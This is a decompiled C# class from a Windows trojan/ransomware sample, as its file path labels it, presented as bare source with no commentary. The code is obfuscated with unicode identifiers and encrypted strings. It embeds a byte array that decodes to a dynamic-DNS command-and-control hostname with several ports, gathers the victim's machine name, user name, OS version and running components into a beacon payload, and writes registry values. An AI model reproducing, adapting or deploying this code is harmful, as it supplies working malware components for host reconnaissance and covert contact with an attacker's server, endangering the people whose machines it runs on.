// Decompiled with JetBrains decompiler
// Type:  
// Assembly: RingBell, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 126B6CA2-9E8E-4E8F-B66A-E8ED3E4C478A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Foreign.gen-8b786784c172c6f8b241b1286a2054294e8dc2c167d9b4daae0e310a1d923ba0.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

internal static class \u0005\u2001
{
  public static string \u0002 = \u0008\u2001.\u0002(-2094344284);
  public static string \u0003 = Application.ExecutablePath;
  public static string \u0005;
  public static string \u0008;
  public static string \u0006;
  public static string \u000E;
  public static string \u000F;
  public static string \u0002\u2000;
  public static string \u0003\u2000;
  public static string \u0005\u2000;
  public static byte[] \u0008\u2000;
  public static int \u0006\u2000;
  public static int[] \u000E\u2000;
  public static string \u000F\u2000;
  public static string \u0002\u2001;
  public static string \u0003\u2001;
  public static string \u0005\u2001;
  public static string \u0008\u2001;
  public static string \u0006\u2001;
  public static string \u000E\u2001;
  public static string \u000F\u2001;
  public static string \u0002\u2002;
  public static string \u0003\u2002;

  static \u0005\u2001()
  {
    char[] chArray1 = new char[1]{ '|' };
    \u0005\u2001.\u0005 = \u0008\u2001.\u0002(-2094344216).Split(chArray1)[0];
    char[] chArray2 = new char[1]{ '|' };
    \u0005\u2001.\u0008 = \u0008\u2001.\u0002(-2094344205).Split(chArray2)[0];
    char[] chArray3 = new char[1]{ '|' };
    \u0005\u2001.\u0006 = \u0008\u2001.\u0002(-2094344443).Split(chArray3)[0];
    char[] chArray4 = new char[1]{ '|' };
    \u0005\u2001.\u000E = \u0008\u2001.\u0002(-2094344402).Split(chArray4)[0];
    char[] chArray5 = new char[1]{ '|' };
    \u0005\u2001.\u000F = \u0008\u2001.\u0002(-2094344397).Split(chArray5)[0];
    char[] chArray6 = new char[1]{ '|' };
    \u0005\u2001.\u0002\u2000 = \u0008\u2001.\u0002(-2094344359).Split(chArray6)[0];
    \u0005\u2001.\u0003\u2000 = Path.GetFileNameWithoutExtension(Application.ExecutablePath);
    char[] chArray7 = new char[1]{ '|' };
    \u0005\u2001.\u0005\u2000 = \u0008\u2001.\u0002(-2094344350).Split(chArray7)[0];
    \u0005\u2001.\u0008\u2000 = new byte[26]
    {
      (byte) 115,
      (byte) 119,
      (byte) 105,
      (byte) 115,
      (byte) 115,
      (byte) 97,
      (byte) 99,
      (byte) 99,
      (byte) 111,
      (byte) 117,
      (byte) 110,
      (byte) 116,
      (byte) 46,
      (byte) 100,
      (byte) 100,
      (byte) 110,
      (byte) 115,
      (byte) 46,
      (byte) 110,
      (byte) 101,
      (byte) 116,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0
    };
    \u0005\u2001.\u0006\u2000 = 10019;
    \u0005\u2001.\u000E\u2000 = new int[5]
    {
      10019,
      57000,
      35010,
      47834,
      33009
    };
    \u0005\u2001.\u0002\u2001 = string.Empty;
    \u0005\u2001.\u0003\u2001 = string.Empty;
    \u0005\u2001.\u0005\u2001 = string.Empty;
    \u0005\u2001.\u0008\u2001 = string.Empty;
    char[] chArray8 = new char[1]{ '|' };
    \u0005\u2001.\u0006\u2001 = \u0008\u2001.\u0002(-2094344329).Split(chArray8)[0];
    char[] chArray9 = new char[1]{ '|' };
    \u0005\u2001.\u000E\u2001 = \u0008\u2001.\u0002(-2094344452).Split(chArray9)[0];
    char[] chArray10 = new char[1]{ '|' };
    \u0005\u2001.\u000F\u2001 = \u0008\u2001.\u0002(-2094344703).Split(chArray10)[0];
    char[] chArray11 = new char[1]{ '|' };
    \u0005\u2001.\u0002\u2002 = \u0008\u2001.\u0002(-2094344664).Split(chArray11)[0];
    char[] chArray12 = new char[1]{ '|' };
    \u0005\u2001.\u0003\u2002 = \u0008\u2001.\u0002(-2094344643).Split(chArray12)[0];
  }

  public static byte[] \u0002(string _param0)
  {
    MemoryStream memoryStream = new MemoryStream();
    TextWriter textWriter = (TextWriter) new StreamWriter((Stream) memoryStream);
    textWriter.Write(_param0);
    textWriter.Flush();
    memoryStream.Flush();
    return memoryStream.ToArray();
  }

  public static byte[] \u0002()
  {
    byte[] numArray;
    try
    {
      string empty = string.Empty;
      char[] chArray1 = new char[1]{ '|' };
      string str1 = \u0008\u2001.\u0002(-2094344636).Split(chArray1)[0];
      char[] chArray2 = new char[1]{ '!' };
      string str2 = \u0008\u2001.\u0002(-2094344593).Split(chArray2)[0];
      string[] strArray1 = new string[10];
      char[] chArray3 = new char[1]{ '!' };
      strArray1[0] = \u0008\u2001.\u0002(-2094344589).Split(chArray3)[0];
      strArray1[1] = \u0005\u2001.\u000F\u2000;
      char[] chArray4 = new char[1]{ '!' };
      strArray1[2] = \u0008\u2001.\u0002(-2094344816).Split(chArray4)[0];
      strArray1[3] = \u0005\u2001.\u0003\u2000;
      char[] chArray5 = new char[1]{ '!' };
      strArray1[4] = \u0008\u2001.\u0002(-2094344774).Split(chArray5)[0];
      strArray1[5] = \u0005\u2001.\u0002();
      char[] chArray6 = new char[1]{ '!' };
      strArray1[6] = \u0008\u2001.\u0002(-2094344756).Split(chArray6)[0];
      char[] chArray7 = new char[1]{ '!' };
      strArray1[7] = \u0008\u2001.\u0002(-2094344726).Split(chArray7)[0];
      strArray1[8] = \u0005\u2001.\u0005\u2000;
      char[] chArray8 = new char[1]{ '|' };
      strArray1[9] = \u0008\u2001.\u0002(-2094343391).Split(chArray8)[0];
      string str3 = string.Concat(strArray1);
      string str4 = \u0005\u2001.\u0005();
      string str5 = \u0005\u2001.\u0002\u2000;
      char[] chArray9 = new char[1]{ '!' };
      string productVersion1;
      string str6;
      if (!File.Exists(str4 + str5 + \u0008\u2001.\u0002(-2094343416).Split(chArray9)[0]))
      {
        char[] chArray10 = new char[1]{ '!' };
        productVersion1 = \u0008\u2001.\u0002(-2094344720).Split(chArray10)[0];
        char[] chArray11 = new char[1]{ '!' };
        str6 = \u0008\u2001.\u0002(-2094344933).Split(chArray11)[0];
      }
      else
      {
        string str7 = \u0005\u2001.\u0005();
        string str8 = \u0005\u2001.\u0002\u2000;
        char[] chArray12 = new char[1]{ '!' };
        productVersion1 = FileVersionInfo.GetVersionInfo(str7 + str8 + \u0008\u2001.\u0002(-2094343416).Split(chArray12)[0]).ProductVersion;
        if (Process.GetProcessesByName(\u0005\u2001.\u0002\u2000).Length != 0)
        {
          char[] chArray13 = new char[1]{ '!' };
          str6 = \u0008\u2001.\u0002(-2094344922).Split(chArray13)[0];
        }
        else
        {
          char[] chArray14 = new char[1]{ '!' };
          str6 = \u0008\u2001.\u0002(-2094344888).Split(chArray14)[0];
        }
      }
      string[] strArray2 = new string[12];
      strArray2[0] = str3;
      char[] chArray15 = new char[1]{ '!' };
      strArray2[1] = \u0008\u2001.\u0002(-2094344874).Split(chArray15)[0];
      strArray2[2] = str6;
      char[] chArray16 = new char[1]{ '!' };
      strArray2[3] = \u0008\u2001.\u0002(-2094344840).Split(chArray16)[0];
      strArray2[4] = productVersion1;
      char[] chArray17 = new char[1]{ '!' };
      strArray2[5] = \u0008\u2001.\u0002(-2094344816).Split(chArray17)[0];
      strArray2[6] = \u0005\u2001.\u0002\u2000;
      char[] chArray18 = new char[1]{ '!' };
      strArray2[7] = \u0008\u2001.\u0002(-2094344774).Split(chArray18)[0];
      strArray2[8] = \u0005\u2001.\u0005();
      char[] chArray19 = new char[1]{ '!' };
      strArray2[9] = \u0008\u2001.\u0002(-2094345075).Split(chArray19)[0];
      strArray2[10] = \u0005\u2001.\u0002\u2000;
      char[] chArray20 = new char[1]{ '|' };
      strArray2[11] = \u0008\u2001.\u0002(-2094343391).Split(chArray20)[0];
      string str9 = string.Concat(strArray2);
      string str10 = \u0005\u2001.\u0003();
      string str11 = \u0005\u2001.\u000E;
      char[] chArray21 = new char[1]{ '!' };
      string productVersion2;
      string str12;
      if (!File.Exists(str10 + str11 + \u0008\u2001.\u0002(-2094343416).Split(chArray21)[0]))
      {
        char[] chArray22 = new char[1]{ '!' };
        productVersion2 = \u0008\u2001.\u0002(-2094344720).Split(chArray22)[0];
        char[] chArray23 = new char[1]{ '!' };
        str12 = \u0008\u2001.\u0002(-2094344933).Split(chArray23)[0];
      }
      else
      {
        string str13 = \u0005\u2001.\u0003();
        string str14 = \u0005\u2001.\u000E;
        char[] chArray24 = new char[1]{ '!' };
        productVersion2 = FileVersionInfo.GetVersionInfo(str13 + str14 + \u0008\u2001.\u0002(-2094343416).Split(chArray24)[0]).ProductVersion;
        char[] chArray25 = new char[1]{ '!' };
        str12 = \u0008\u2001.\u0002(-2094345046).Split(chArray25)[0];
      }
      string[] strArray3 = new string[12];
      strArray3[0] = str9;
      char[] chArray26 = new char[1]{ '!' };
      strArray3[1] = \u0008\u2001.\u0002(-2094345027).Split(chArray26)[0];
      strArray3[2] = str12;
      char[] chArray27 = new char[1]{ '!' };
      strArray3[3] = \u0008\u2001.\u0002(-2094344840).Split(chArray27)[0];
      strArray3[4] = productVersion2;
      char[] chArray28 = new char[1]{ '!' };
      strArray3[5] = \u0008\u2001.\u0002(-2094344816).Split(chArray28)[0];
      strArray3[6] = \u0005\u2001.\u000E;
      char[] chArray29 = new char[1]{ '!' };
      strArray3[7] = \u0008\u2001.\u0002(-2094344774).Split(chArray29)[0];
      strArray3[8] = \u0005\u2001.\u0003();
      char[] chArray30 = new char[1]{ '!' };
      strArray3[9] = \u0008\u2001.\u0002(-2094345075).Split(chArray30)[0];
      strArray3[10] = \u0005\u2001.\u000E;
      char[] chArray31 = new char[1]{ '|' };
      strArray3[11] = \u0008\u2001.\u0002(-2094343391).Split(chArray31)[0];
      string str15 = string.Concat(strArray3);
      string str16 = \u0005\u2001.\u0006();
      string str17 = \u0005\u2001.\u0002\u2002;
      char[] chArray32 = new char[1]{ '!' };
      string productVersion3;
      string str18;
      if (!File.Exists(str16 + str17 + \u0008\u2001.\u0002(-2094343416).Split(chArray32)[0]))
      {
        char[] chArray33 = new char[1]{ '!' };
        productVersion3 = \u0008\u2001.\u0002(-2094344720).Split(chArray33)[0];
        char[] chArray34 = new char[1]{ '!' };
        str18 = \u0008\u2001.\u0002(-2094344933).Split(chArray34)[0];
      }
      else
      {
        string str19 = \u0005\u2001.\u0006();
        string str20 = \u0005\u2001.\u0002\u2002;
        char[] chArray35 = new char[1]{ '!' };
        productVersion3 = FileVersionInfo.GetVersionInfo(str19 + str20 + \u0008\u2001.\u0002(-2094343416).Split(chArray35)[0]).ProductVersion;
        if (Process.GetProcessesByName(\u0005\u2001.\u0002\u2002).Length != 0)
        {
          char[] chArray36 = new char[1]{ '!' };
          str18 = \u0008\u2001.\u0002(-2094344922).Split(chArray36)[0];
        }
        else
        {
          char[] chArray37 = new char[1]{ '!' };
          str18 = \u0008\u2001.\u0002(-2094344888).Split(chArray37)[0];
        }
      }
      string[] strArray4 = new string[14];
      strArray4[0] = str15;
      char[] chArray38 = new char[1]{ '!' };
      strArray4[1] = \u0008\u2001.\u0002(-2094345017).Split(chArray38)[0];
      strArray4[2] = str18;
      char[] chArray39 = new char[1]{ '!' };
      strArray4[3] = \u0008\u2001.\u0002(-2094344840).Split(chArray39)[0];
      strArray4[4] = productVersion3;
      char[] chArray40 = new char[1]{ '!' };
      strArray4[5] = \u0008\u2001.\u0002(-2094344816).Split(chArray40)[0];
      strArray4[6] = \u0005\u2001.\u0002\u2002;
      char[] chArray41 = new char[1]{ '!' };
      strArray4[7] = \u0008\u2001.\u0002(-2094344774).Split(chArray41)[0];
      strArray4[8] = \u0005\u2001.\u0006();
      char[] chArray42 = new char[1]{ '!' };
      strArray4[9] = \u0008\u2001.\u0002(-2094345075).Split(chArray42)[0];
      strArray4[10] = \u0005\u2001.\u0002\u2002;
      char[] chArray43 = new char[1]{ '!' };
      strArray4[11] = \u0008\u2001.\u0002(-2094344983).Split(chArray43)[0];
      strArray4[12] = \u0005\u2001.\u0006;
      char[] chArray44 = new char[1]{ '|' };
      strArray4[13] = \u0008\u2001.\u0002(-2094343391).Split(chArray44)[0];
      numArray = \u0005\u2001.\u0002(string.Concat(strArray4));
    }
    catch
    {
      numArray = (byte[]) null;
    }
    return numArray;
  }

  public static string \u0002() => Path.GetDirectoryName(\u0005\u2001.\u0003) + \u0008\u2001.\u0002(-2094344975);

  public static string \u0003() => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + \u0005\u2001.\u0003\u2002;

  public static void \u0002()
  {
    char[] chArray = new char[1]{ '!' };
    \u0005\u2001.\u000F\u2000 = \u0008\u2001.\u0002(-2094345207).Split(chArray)[0];
    \u0005\u2001.\u0002\u2001 = Environment.MachineName;
    \u0005\u2001.\u0003\u2001 = Environment.UserName;
  }

  public static string \u0005() => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + \u0005\u2001.\u000F\u2001;

  public static string \u0008()
  {
    string str1;
    try
    {
      OperatingSystem osVersion = Environment.OSVersion;
      string str2 = osVersion.Version.Major.ToString();
      int minor = osVersion.Version.Minor;
      str1 = str2 + \u0008\u2001.\u0002(-2094345347) + minor.ToString();
    }
    catch
    {
      char[] chArray = new char[1]{ '!' };
      str1 = \u0008\u2001.\u0002(-2094345200).Split(chArray)[0];
    }
    return str1;
  }

  public static void \u0002(string _param0, string _param1)
  {
    try
    {
      RegistryKey currentUser = Registry.CurrentUser;
      char[] chArray = new char[1]{ '|' };
      RegistryKey registryKey = currentUser.OpenSubKey(\u0008\u2001.\u0002(-2094345177).Split(chArray)[0], true);
      object obj = registryKey.GetValue(\u0005\u2001.\u0005\u2000 + _param0);
      if (obj != null && !(obj.ToString() != _param1))
        return;
      registryKey.SetValue(\u0005\u2001.\u0005\u2000 + _param0, (object) _param1);
    }
    catch
    {
    }
  }

  public static string \u0006() => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + \u0005\u2001.\u0005;
}
